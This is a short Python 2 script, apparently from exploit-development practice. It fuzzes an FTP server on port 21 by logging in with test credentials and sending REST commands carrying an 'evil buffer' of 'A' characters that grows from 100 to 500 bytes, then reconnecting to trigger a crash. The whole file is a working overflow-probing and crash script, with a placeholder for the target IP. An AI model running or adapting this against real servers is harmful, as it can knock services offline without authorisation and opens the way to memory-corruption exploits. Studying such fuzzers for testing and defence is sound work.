#!/usr/bin/python3
import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

size = 100 #defining an initial buffer size

while(size < 500): #using a while loop to keep sending the buffer until it reaches 500 bytes
    try:
        print "\n[+]Sending evil buffer with %s bytes" % size
    	buffer ="A" * size #defining the buffer as a bunch of As
    	s = socket(AF_INET,SOCK_STREAM)
    	s.connect(("<insertiphere>",21)) #establishing connection
    	s.recv(2000) # get data back from the socket.
    	s.send("USER test\r\n") #sending username
    	s.recv(2000) # get data back from the socket.
    	s.send("PASS test\r\n") #sending password
    	s.recv(2000) # get data back from the socket.   
    	s.send("REST "+ buffer +"\r\n") #sending rest and buffer. This specific line is prevalent based on whhere the buffer occurs and can be modified or closed out.
    	s.close() #closing the connection
    	s = socket(AF_INET,SOCK_STREAM) # try to connect to the application again.
    	s.connect(("<insertiphere>",21)) #an additional connection is needed for the crash to occur
    	sleep(2) #waiting 2 seconds
    	s.close() #closing the connection

        size +=100 #increasing the buffer size by 100
        sleep(10) #waiting 10 seconds before repeating the loop

    except: #if a connection can't be made, print an error and exited safely.
    	print "[-]Error in connection with server"
    	sys.exit()